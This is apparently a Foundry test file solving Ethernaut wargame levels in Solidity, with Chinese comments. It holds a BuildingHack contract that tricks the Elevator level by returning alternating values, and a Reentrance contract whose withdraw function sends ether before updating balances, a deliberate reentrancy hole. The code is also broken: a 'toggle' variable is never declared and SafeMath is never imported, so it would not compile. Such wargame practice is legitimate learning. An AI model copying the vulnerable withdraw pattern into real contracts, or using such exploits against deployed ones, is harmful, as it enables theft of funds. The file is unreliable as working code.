// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../../src/ethernaut/Elevator.sol";


interface Building {
    function isLastFloor(uint256) external returns (bool);
}


contract BuildingHack is Building {


    function isLastFloor(uint256) external override returns (bool) {
        toggle = !toggle; // 每次调用时切换状态
        return toggle;
    }


    function attack(Elevator elevator, uint256 _floor) external {
        elevator.goTo(_floor);
    }
}

// 测试合约
contract ElevatorTest is Test {
    Elevator elevator;
    BuildingHack hack;

    function setUp() public {
        elevator = new Elevator();
        hack = new BuildingHack();
    }

    function testElevatorAttack() public {
        hack.attack(elevator, 1);
        assertTrue(elevator.top(), unicode"攻击失败，未到达顶层");
    }
}

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            require(result, "资金转移失败");
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}


contract ReentranceTest is Test {
    Reentrance reentrance;

    function setUp() public {
        reentrance = new Reentrance();
    }

    function testInjectFunds() public {
        (bool success,) = address(reentrance).call{value: 1 ether}(""); 
        require(success, "资金注入失败");
    }
}
